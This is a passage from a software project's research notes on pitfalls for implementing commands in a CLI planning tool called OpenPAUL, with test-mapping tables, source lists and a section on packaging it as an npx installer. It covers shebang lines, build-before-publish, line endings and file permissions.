| Orphaned Session Files | Both pause AND resume | Test: pause 3 times, verify only 1 session file exists |
| Incomplete Context Capture | Pause command implementation | Test: pause mid-task, resume after 24h, verify immediate productivity |
| Handoff Document Drift | Handoff command implementation | Test: generate handoff, modify ROADMAP.md, regenerate, verify consistency |
| Deprecation Without Migration Path | Status deprecation | Test: run /paul:status, verify helpful message AND docs updated |
| State Version Mismatch | Both pause AND resume | Test: create v1 session file manually, resume with v2 code, verify migration |
| Race Conditions | State manager enhancement | Test: two concurrent pause operations, verify atomic handling |

**Roadmap Management**
| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Phase Number Collisions | add-phase implementation | Test: add phase 5 when 5 exists, verify error |
| Orphaned Plans/State | remove-phase implementation | Test: remove phase 3, verify plan files deleted |
| Dependency Chain Corruption | Both add/remove + dependency graph | Test: remove phase 3, verify phase 4 dependencies updated |
| Missing Dependency Graph | Infrastructure BEFORE roadmap commands | Test: parse ROADMAP.md, validate graph structure |

**Milestone Management**
| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Milestone State Desync | All milestone commands | Test: complete phase, verify milestone progress updates |
| Multiple Active Milestones | milestone command | Test: create second active milestone, verify error |

**Pre-Planning**
| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Research Artifacts Accumulate | All four pre-planning commands | Test: complete phase, verify research archived |
| Research Redundancy | All four pre-planning commands | Test: run discuss and assumptions, verify no duplicates |

**Research**
| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| None unique to research | N/A | Pre-planning cleanup covers research artifacts |

**Quality**
| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Verification State Not Persisted | verify command | Test: run verify, check `.paul/verification.json` exists |
| plan-fix Infinite Loop | plan-fix command | Test: trigger plan-fix 3 times, verify stops with guidance |

**Configuration**
| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Configuration Hierarchy Ambiguity | All three config commands | Test: set X in config, set X in flows, verify which wins |
| map-codebase Performance | map-codebase command | Test: run on 10k files, verify < 30 seconds with progress |

## Sources

**Session Management (from v1.0 research):**
- **Session serialization issues:** Web search results on session state serialization problems (ASP.NET, JavaEE patterns) - MEDIUM confidence (general patterns, not dev-tool specific)
- **Workflow handoff mistakes:** Focus & Stack workflow management guide, NimbleWork task handoff article - MEDIUM confidence (project management focused, but patterns apply)
- **State migration:** PlanetScale backward-compatible database changes, Airbyte connector breaking changes docs - HIGH confidence (authoritative sources on state evolution)
- **Deprecation patterns:** React 19 migration guide, common upgrade mistake analysis - HIGH confidence (real-world deprecation experience)
- **Domain expertise:** Personal knowledge of session management in CLI tools, state serialization patterns, developer workflow tools - Used to synthesize and extend web findings

**Roadmap & Dependency Management:**
- **Dependency graph patterns:** Graph theory basics, DAG validation algorithms - HIGH confidence (computer science fundamentals)
- **Cascading deletes:** Database foreign key constraints, Git branch deletion - HIGH confidence (well-established patterns)
- **Phase numbering systems:** Semantic versioning, project phase numbering conventions - MEDIUM confidence (industry practices)
- **Domain expertise:** Personal experience with project roadmap tools, dependency management, phase-based development - Synthesized from experience

**Milestone Management:**
- **Computed state vs. stored state:** React computed properties, database views vs. materialized views - HIGH confidence (fundamental concept)
- **Milestone tracking patterns:** Agile milestone practices, JIRA milestone features - MEDIUM confidence (project management tools)
- **Domain expertise:** Personal experience with milestone tracking in software projects - Synthesized from experience

**Pre-Planning & Research:**
- **Artifact retention policies:** Data retention best practices, log rotation - MEDIUM confidence (general IT practices)
- **Deduplication strategies:** Database deduplication, duplicate detection algorithms - MEDIUM confidence (general patterns)
- **Domain expertise:** Personal experience with research artifacts, knowledge management, developer documentation - Synthesized from experience

**Quality & Verification:**
- **Test result persistence:** CI/CD result storage, test history tracking - MEDIUM confidence (DevOps patterns)
- **Root cause analysis:** Debugging methodologies, failure analysis - MEDIUM confidence (general software engineering)
- **Fix idempotency:** Idempotent operations patterns, retry logic - HIGH confidence (distributed systems concepts)
- **Domain expertise:** Personal experience with verification systems, automated testing, bug fixing workflows - Synthesized from experience

**Configuration Management:**
- **Configuration hierarchies:** .dockerconfig precedence, environment variable vs. file config - MEDIUM confidence (well-established patterns)
- **Config merging strategies:** Webpack config merging, ESLint config composition - MEDIUM confidence (tool-specific patterns)
- **Domain expertise:** Personal experience with CLI config systems, multi-source configuration - Synthesized from experience

**Codebase Mapping:**
- **Incremental indexing:** Search index incremental updates, file system watching - MEDIUM confidence (well-established patterns)
- **Performance patterns:** Large codebase analysis tools (Sourcegraph, GitHub code search) - MEDIUM confidence (tool-specific patterns)
- **Domain expertise:** Personal experience with code analysis tools, AST parsing, file system operations - Synthesized from experience

**CLI Tool Patterns (General):**
- **Atomic file operations:** POSIX rename atomicity, database transactions - HIGH confidence (fundamental concept)
- **User experience patterns:** CLI design best practices, command feedback - MEDIUM confidence (UX principles)
- **Domain expertise:** Personal experience building CLI tools, developer productivity tools - Synthesized from experience

---

## CLI Installer Pitfalls (v2.0 Milestone)

**Domain:** Adding `npx openpaul` CLI installer to existing TypeScript/npm package
**Researched:** 2026-03-20
**Confidence:** HIGH (npm official docs + Stack Overflow verified patterns + GitHub issue research)

### Overview

Adding a `bin` field to package.json to enable `npx openpaul` introduces pitfalls specific to:
1. Existing ESM package (`"type": "module"`)
2. TypeScript compilation to `dist/`
3. Cross-platform compatibility (Windows/Linux/macOS)
4. Package publishing workflow

### Pitfall CLI-1: Missing Shebang Line

**What goes wrong:**
CLI script runs without Node interpreter, resulting in shell syntax errors or "command not found" behavior. On Windows, npm generates a `.cmd` wrapper, but the shebang is still required for npm to detect it as a Node script and generate the wrapper correctly.

**Why it happens:**
Developers forget that `bin` files are executed directly by the OS, not automatically through Node. The shebang (`#!/usr/bin/env node`) tells npm this is a Node script that needs to be run with the node executable.

**How to avoid:**
```javascript
// bin/cli.js - FIRST LINE must be:
#!/usr/bin/env node

import { main } from '../dist/cli.js';
main();
```

**Warning signs:**
- `npx openpaul` shows shell syntax errors instead of Node errors
- Windows users get "not recognized as internal or external command"
- Error messages contain shell syntax (`$`, `;`, etc.) instead of JavaScript

**Phase to address:** CLI Implementation

---

### Pitfall CLI-2: Bin File Not Built Before Publish

**What goes wrong:**
`npm install` fails with `ENOENT: no such file or directory, chmod` when the bin file path points to a file in `dist/` that hasn't been built yet. This is the #1 cause of broken CLI packages.

**Why it happens:**
TypeScript projects compile to `dist/`. If `npm publish` runs before `npm run build`, or if `.npmignore` excludes the build output, the bin file won't exist in the published tarball. Users installing the package get a broken install.

**How to avoid:**
1. Ensure `prepublishOnly` script runs the build:
   ```json
   "scripts": {
     "prepublishOnly": "npm run build"
   }
   ```
2. Verify `files` array includes `dist/`:
   ```json
   "files": ["dist", "README.md", "LICENSE"]
   ```
3. Test locally with `npm pack` and inspect the tarball:
   ```bash
   npm pack
   tar -tf openpaul-*.tgz | grep dist/cli
   ```

**Warning signs:**
- `npm install` errors with `ENOENT ... chmod`
- Published package size is suspiciously small
- `npm pack --dry-run` doesn't show expected files

**Phase to address:** CLI Implementation

---

### Pitfall CLI-3: CRLF Line Endings on *nix

**What goes wrong:**
CLI fails on Linux/macOS with cryptic error: `: No such file or directory` or `/bin/bash^M: bad interpreter`. The script runs fine on Windows but completely breaks elsewhere.

**Why it happens:**
Git on Windows defaults to converting LF to CRLF on checkout. When the bin file has Windows line endings (`\r\n`), the shebang is interpreted as `#!/usr/bin/env node\r` which doesn't exist as a program.

**How to avoid:**
1. Add `.gitattributes` to enforce LF for bin files:
   ```
   bin/cli.js text eol=lf
   *.js text eol=lf
   ```
2. Configure git:
   ```bash
   git config core.autocrlf false
   ```
3. Verify line endings before publish:
   ```bash
   cat -e bin/cli.js | head -3
   # Should show $ not ^M$
   ```

**Warning signs:**
- Works on Windows, fails on Linux/macOS
- Error mentions `^M` or shows weird path with carriage return
- `file bin/cli.js` shows "CRLF" line terminators

**Phase to address:** CLI Implementation

---

### Pitfall CLI-4: ESM + Bin Compatibility

**What goes wrong:**
CLI fails with `require() of ES Module not supported` or `SyntaxError: Cannot use import statement outside a module`. This is specific to packages using `"type": "module"`.

**Why it happens:**
ES modules (`"type": "module"`) require `.mjs` extension OR the file must be in a package marked as ESM. The bin file must either be ESM-compatible or properly import ESM modules.

**How to avoid:**
For OpenPAUL (already ESM with `"type": "module"`):
```javascript
#!/usr/bin/env node
// bin/cli.js - this works because package has "type": "module"

import { main } from '../dist/cli.js';
main();
```

Alternative approaches:
1. Use `.mjs` extension explicitly: `bin/openpaul.mjs`
2. Dynamic import if mixing CJS/ESM: `await import('../dist/cli.js')`
3. Use a wrapper that handles both

**Warning signs:**
- `require() of ES Module` error
- `Cannot use import statement` error
- Works locally but fails when installed from npm

**Phase to address:** CLI Implementation

---

### Pitfall CLI-5: Files Array Excludes Bin Target

**What goes wrong:**
Package installs but `npx openpaul` fails because the bin file's target (e.g., `dist/cli.js`) isn't included in the published tarball.

**Why it happens:**
The `files` field in package.json controls what gets published. If `dist/` isn't explicitly listed, npm won't include it—even though npm automatically includes the bin file itself.

**How to avoid:**
```json
{
  "files": [
    "dist",
    "bin",
    "README.md",
    "LICENSE"
  ],
  "bin": {
    "openpaul": "./bin/cli.js"
  }
}
```

The `bin/cli.js` wrapper is auto-included, but `dist/cli.js` (which it imports) is NOT unless in `files`.

**Warning signs:**
- `npx openpaul` fails with module not found
- `npm pack` tarball is missing expected files
- Installed package has `bin/` but no `dist/`

**Phase to address:** CLI Implementation

---

### Pitfall CLI-6: npx Prompts and Install Confusion

**What goes wrong:**
First-time `npx openpaul` users see "Need to install the following packages: openpaul. Ok to proceed? (y)" and may not understand what's happening.

**Why it happens:**
npm 7+ prompts before installing packages not in the local project. This is a security/UX feature but can confuse users.

**How to avoid:**
Document clearly:
```markdown
## Installation

# Run directly (will prompt to install)
npx openpaul

# Or install globally first
npm install -g openpaul
openpaul
```

**Phase to address:** Documentation

---

### Pitfall CLI-7: Breaking Existing Plugin Behavior

**What goes wrong:**
Adding `bin` field changes how the package is categorized. Existing users who `import` the plugin may see unexpected side effects, or build systems may start treating it as a CLI tool.

**Why it happens:**
Tools like `npm install` may warn about packages with `bin` being installed globally. Some build systems auto-discover CLI tools.

**How to avoid:**
1. Add `preferGlobal: false` (or omit — default is false)
2. Test that `import openpaul` still works as a plugin
3. Ensure CLI and plugin functionality are independent

**Phase to address:** CLI Implementation

---

### Pitfall CLI-8: Permission Denied on Bin File

**What goes wrong:**
`npx openpaul` fails with `EACCES: permission denied`. The bin file lacks execute permission.

**Why it happens:**
npm attempts to `chmod +x` the bin file during install, but if the source file in git lacks execute permission and the system has restrictive umask, it can fail.

**How to avoid:**
```bash
chmod +x bin/cli.js
git add bin/cli.js
git commit -m "chore: make bin executable"
```

**Phase to address:** CLI Implementation

---

### CLI Installer: Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip `prepublishOnly` build | Faster local dev | Broken published packages | Never |
| Use CRLF on Windows | Works locally | Breaks on Linux/macOS | Never |
| Hardcode node path in shebang | Avoids env lookup | Breaks on non-standard node installs | Never |
| Skip .gitattributes | One less file | Line ending bugs in team | Never |
| Omit from `files` array | Smaller tarball | Missing files at install | Only for dev-only files |

### CLI Installer: Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| npm publish | Publishing without verifying bin works | `npm pack && tar -tf *.tgz && npm install -g *.tgz && openpaul --version` |
| CI/CD | Not testing CLI invocation | Add E2E test: `npx . init --help` |
| TypeScript | Bin importing from src/ instead of dist/ | Bin should always import compiled output |
| Global install | Not handling multiple install scenarios | Support both `npx` and `npm install -g` |

### CLI Installer: "Looks Done But Isn't" Checklist

- [ ] **Shebang:** Verify `#!/usr/bin/env node` is literally the first line (no BOM, no leading spaces)
- [ ] **Line endings:** Run `file bin/cli.js` on Linux/Mac — should show "ASCII text" not "ASCII text, with CRLF"
- [ ] **Package contents:** `npm pack --dry-run 2>&1 | grep dist/` — should list all required dist files
- [ ] **Actual execution:** `npm link && openpaul --version && npm unlink -g` — must actually work
- [ ] **Cross-platform:** Test on Windows (or CI) — npx wrapper generation differs
- [ ] **Fresh install simulation:** `npm pack && npm install -g ./openpaul-*.tgz && openpaul` — full cycle

### CLI Installer: Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Missing shebang | LOW | Add shebang, bump patch version, republish |
| CRLF line endings | LOW | Add .gitattributes, fix files, bump patch, republish |
| Bin file not built | MEDIUM | Fix prepublishOnly, bump patch, verify with pack, republish |
| Files array missing | MEDIUM | Add to files, bump patch, verify with pack, republish |
| ESM import error | HIGH | May require restructuring bin file and/or build process |

### CLI Installer: Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Missing shebang | CLI Implementation | `head -1 bin/cli.js` shows shebang |
| Bin file not built | CLI Implementation | `npm pack && tar -tf *.tgz | grep dist` |
| CRLF line endings | CLI Implementation | `.gitattributes` exists, `file bin/cli.js` shows LF |
| ESM compatibility | CLI Implementation | E2E test with `npx .` |
| Files array | CLI Implementation | `npm pack --dry-run` shows all files |
| npx prompt documentation | Documentation | README explains npx behavior |
| Breaking plugin | CLI Implementation | Plugin tests still pass |
| Permission denied | CLI Implementation | `ls -l bin/cli.js` shows execute bit |

### CLI Installer: Sources

- [npm package.json bin documentation](https://docs.npmjs.com/cli/v10/configuring-npm/package-json#bin) — HIGH confidence
- [npm npx documentation](https://docs.npmjs.com/cli/v11/commands/npx/) — HIGH confidence
- [Stack Overflow: npm bin on Windows](https://stackoverflow.com/questions/25333570/npm-package-json-bin-wont-work-on-windows) — HIGH confidence (18+ upvotes)
- [npm/cli GitHub Issue #4597: Install fails if bin script doesn't exist](https://github.com/npm/cli/issues/4597) — HIGH confidence (official repo)
- [npm/cli GitHub Issue #7302: npm publish complains on bin field](https://github.com/npm/cli/issues/7302) — MEDIUM confidence

---

*Pitfalls research for: Full PAUL command implementation (26 commands across 8 categories)*
*Context: OpenPAUL v1.1 - implementing remaining 20 commands after v1.0 baseline*
*Researched: 2026-03-05*

*CLI Installer pitfalls added: 2026-03-20 for v2.0 milestone*
